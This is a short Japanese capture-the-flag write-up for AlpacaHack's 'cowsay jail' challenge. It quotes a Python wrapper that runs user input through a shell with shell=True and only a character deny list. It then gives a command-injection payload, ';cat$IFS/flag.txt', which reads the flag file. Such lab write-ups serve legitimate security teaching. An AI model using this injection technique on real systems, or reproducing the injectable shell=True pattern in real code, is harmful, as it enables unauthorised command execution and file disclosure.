# ■ Writeup::cowsay jail
[cowsay jail - AlpacaHack](https://alpacahack.com/daily/challenges/cowsay-jail)

# 1. Solution
- `';'`, `$IFS` は `deny_list` によって禁止されていない.

これを用いて入力を与えれば良い.

- 入力例:
```bash
$ nc localhost 1337
$ cowsay ;cat$IFS/flag.txt
 __
<  >
 --
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Alpaca{REDACTED}
```
# 2. Explanation
- `jail.py`:
```python
 1	import subprocess
 2	
 3	argument = input("$ cowsay ")
 4	
 5	deny_list = ["\t", " ", "-", "'", '"', "`", "(", ")", "<", ">", "&", "|"]
 6	denied_characters = [c for c in deny_list if c in argument]
 7	if len(denied_characters) > 0:
 8	    raise SystemExit(f"The argument contains at least 1 denied character(s): {denied_characters}")
 9	
10	subprocess.run(
11	    f"cowsay {argument}",
12	    shell=True,
13	    stdin=subprocess.DEVNULL,  # no input
14	)
```

`';'` が禁止されていないので, 

```python
11	    f"cowsay {argument}",
```

による `cowsay` と別のコマンドとを区切ることができる.

また, スペース `' '` は禁止されているが `'$'` が禁止されていないので, 内部フィールドセパレータ環境変数 `$IFS` をスペースとして使うことでシェルが単語分割してくれる.

これ `cat$IFS/flag.txt` を用いて `cat /flag.txt` を再現する.

以上よりペイロードは

```
;cat$IFS/flag.txt
```

となる.